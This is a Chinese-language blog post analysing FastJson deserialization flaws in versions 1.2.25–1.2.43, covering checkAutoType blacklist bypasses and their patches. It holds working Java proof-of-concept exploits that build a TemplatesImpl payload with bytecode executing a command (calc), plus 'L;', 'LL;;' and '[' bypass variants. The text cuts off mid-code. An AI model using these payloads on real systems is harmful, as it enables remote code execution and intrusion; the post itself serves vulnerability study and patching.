class="comment">//对白名单，进行匹配；如果匹配中，调用loadClass加载，赋值clazz直接返回</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept = acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"> </span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//此处省略了当clazz不为null时的处理情况，与expectClass有关</span></span><br><span class="line">        <span class="comment">//但是我们这里输入固定是null，不执行此处代码</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">//可以发现如果上面没有触发黑名单，返回，也没有触发白名单匹配中的话，就会在此处被拦截报错返回。</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//执行不到此处</span></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当默认关闭autotype时，要求不匹配到黑名单，同时必须匹配到白名单的class才可以成功加载</p><p>看下默认的黑名单和白名单（白名单为空，最下面）</p><p><img src="/2021/10/29/Java_06/20211015172817.png" alt="image-20211015172816830"></p><p><code>com.sun</code>，上面两条路都被堵死了。因此，在后续的FastJson利用链中，攻防点主要在于开发者手动开启了autotype，对黑名单的绕过和加固。</p><h2 id="1-2-25-lt-ver-lt-1-2-41"><a href="#1-2-25-lt-ver-lt-1-2-41" class="headerlink" title="1.2.25&lt;=ver&lt;=1.2.41"></a>1.2.25&lt;=ver&lt;=1.2.41</h2><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>需要手动开启autotype</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.12.0.GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.directory.studio<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>org.apache.commons.codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>jdk1.8.0_161</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.*;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Evil"</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())))</span>;<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">"&#123; Runtime.getRuntime().exec(\"calc\"); &#125;"</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);<span class="comment">//添加构造函数</span></span><br><span class="line">        <span class="keyword">byte</span>[] byteCode=cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line"> </span><br><span class="line">        String evilCode=Base64.encodeBase64String(byteCode);</span><br><span class="line"> </span><br><span class="line">        String poc=<span class="string">"&#123;\n"</span> +</span><br><span class="line">                <span class="string">"\"@type\":\"Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\",\n"</span> +</span><br><span class="line">                <span class="string">"\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],\n"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"xx\",\n"</span> +</span><br><span class="line">                <span class="string">"\"_tfactory\":&#123; &#125;,\n"</span> +</span><br><span class="line">                <span class="string">"\"_outputProperties\":&#123; &#125;\n"</span> +</span><br><span class="line">                <span class="string">"&#125;"</span>;</span><br><span class="line"> </span><br><span class="line">        System.out.println(poc);</span><br><span class="line"> </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>开启auto后checkAutoType的逻辑判断</p><p>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> i;</span><br><span class="line">            String deny;</span><br><span class="line">            <span class="comment">//同样会进行白名单检测</span></span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">                deny = <span class="keyword">this</span>.acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//黑名单检测</span></span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">                deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//其他一些逻辑和autotype关闭的逻辑</span></span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样会先进行黑白名单检测，如果都不满足，开启autotype后会进入<code>TypeUtils.loadClass</code>尝试读取类，跟进loadClass逻辑</p><p><img src="/2021/10/29/Java_06/20211020161311.png" alt="image-20211020161303194"></p><p>可以看到，当className以<code>L</code>开头并以<code>;</code>时，会直接去掉<code>L</code>和<code>;</code>，然后加载。这是由于历史原因，<code>X.class.getName</code> 方法在应用于数组类型时会返回奇怪的名字，这也是对特征的兼容。</p><p><img src="/2021/10/29/Java_06/20211020161606.png" alt="image-20211020161605568"></p><p>那么我们可以在想要反序列化的类名加上<code>L</code>开头，<code>;</code>结尾，来绕过黑名单的检测。</p><p>添加<code>[</code>也可以，不过这是1.2.43版本的绕过方式了。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.2.42版本checkAutoType逻辑和之前差不多，只是黑白名单判断这里采用hash去替代startwith。为了防范1.2.41版本的绕过，这里开头直接删除掉了<code>L</code>和结尾的<code>;</code>（如果类名存包含的话）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &lt; <span class="number">128</span> &amp;&amp; typeName.length() &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">        String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">//对L 和 ; 处理，直接删除</span></span><br><span class="line">        <span class="keyword">long</span> BASIC = -<span class="number">3750763034362895579L</span>;</span><br><span class="line">        <span class="keyword">long</span> PRIME = <span class="number">1099511628211L</span>;</span><br><span class="line">        <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">            className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//白名单，黑名单判断，换成了hash判断</span></span><br><span class="line">        <span class="keyword">long</span> h3 = (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">2</span>)) * <span class="number">1099511628211L</span>;</span><br><span class="line">        <span class="keyword">long</span> hash;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            hash = h3;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                hash ^= (<span class="keyword">long</span>)className.charAt(i);</span><br><span class="line">                hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这里采用hash的方式去验证黑白名单，那么我们理论上可以遍历所有的jar包，计算出对应的类名，github上有一个<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">项目</a>已经完成了这个事情。</p><h2 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h2><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.42<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.12.0.GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.directory.studio<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>org.apache.commons.codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>jdk1.8.0_161</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.*;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Evil"</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())))</span>;<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">"&#123; Runtime.getRuntime().exec(\"calc\"); &#125;"</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);<span class="comment">//添加构造函数</span></span><br><span class="line">        <span class="keyword">byte</span>[] byteCode=cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line"> </span><br><span class="line">        String evilCode=Base64.encodeBase64String(byteCode);</span><br><span class="line"> </span><br><span class="line">        String poc=<span class="string">"&#123;\n"</span> +</span><br><span class="line">                <span class="string">"\"@type\":\"LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;\",\n"</span> +</span><br><span class="line">                <span class="string">"\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],\n"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"xx\",\n"</span> +</span><br><span class="line">                <span class="string">"\"_tfactory\":&#123; &#125;,\n"</span> +</span><br><span class="line">                <span class="string">"\"_outputProperties\":&#123; &#125;\n"</span> +</span><br><span class="line">                <span class="string">"&#125;"</span>;</span><br><span class="line"> </span><br><span class="line">        System.out.println(poc);</span><br><span class="line"> </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>上面提到了1.2.42版本checkAutoType函数会先去除掉开头的<code>L</code>和结尾的<code>;</code>，但是<code>TypeUtils.loadClass</code>处理逻辑依然会处理掉<code>L</code>和<code>;</code>，那么直接双写<code>L</code>和<code>;</code>就可以绕过</p><h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</p><p><img src="/2021/10/29/Java_06/20211021170554.png" alt="image-20211021170546752"></p><p>双写可以绕过，直接检测是否以<code>LL</code>开头，简单粗暴</p><h2 id="1-2-43"><a href="#1-2-43" class="headerlink" title="1.2.43"></a>1.2.43</h2><h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>jdk1.8.0_161</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.*;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Evil"</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())))</span>;<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">"&#123; Runtime.getRuntime().exec(\"calc\"); &#125;"</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);<span class="comment">//添加构造函数</span></span><br><span class="line">        <span class="keyword">byte</span>[] byteCode=cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line"> </span><br><span class="line">        String evilCode=Base64.encodeBase64String(byteCode);</span><br><span class="line"> </span><br><span class="line">        String poc=<span class="string">"&#123;\n"</span> +</span><br><span class="line">                <span class="string">"\"@type\":\"[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"[&#123;,\n"</span> +</span><br><span class="line">                <span class="string">"\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],\n"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"xx\",\n"</span> +</span><br><span class="line">                <span class="string">"\"_tfactory\":&#123; &#125;,\n"</span> +</span><br><span class="line">                <span class="string">"\"_outputProperties\":&#123; &#125;\n"</span> +</span><br><span class="line">                <span class="string">"&#125;"</span>;</span><br><span class="line"> </span><br><span class="line">        System.out.println(poc);</span><br><span class="line"> </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>使用这个payload</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 